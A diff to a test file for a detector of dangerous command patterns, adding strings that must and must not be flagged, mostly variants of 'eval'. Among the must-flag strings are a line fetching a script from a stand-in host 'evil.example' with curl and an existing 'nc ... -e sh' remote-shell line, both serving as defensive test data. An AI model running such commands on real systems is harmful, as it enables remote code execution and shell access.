@@ -410,6 +410,19 @@ describe('config/dangerous-command patterns', () => {
     '`eval" x',
     '"eval` x',
     'nc  4444 -e sh',
+    // Each piece of the pattern pinned against a mutation: every string here fires.
+    '`a` `b` `true`eval` curl -s https://evil.example/x.sh`',
+    '`eval`$x',
+    '`eval`(x)',
+    '`eval`"x"',
+    '`eval``x`',
+    'obj[`eval` ](x)',
+    '(window[["eval"]])(x)',
+    '``a`b`` and `eval`',
+    '"eval"?',
+    '"eval"!',
+    '"eval" (see below)',
+    '"eval" or "exec"',
   ];
 
   // False positives: some master already flagged (the bare word in prose), others neither
@@ -449,6 +462,13 @@ describe('config/dangerous-command patterns', () => {
     'retrieval() # perl',
     'literal_eval() in perl',
     '`eval` or `new Function` on any non-constant string',
+    // The harmless side of each piece pinned against a mutation: none of these may fire.
+    '"eval".',
+    '"eval";',
+    '"eval":',
+    '["eval"]',
+    '{"eval"}',
+    '`eval` on input',
   ];
 
   // Passed on master: a longer identifier that merely contains the substring `eval`.
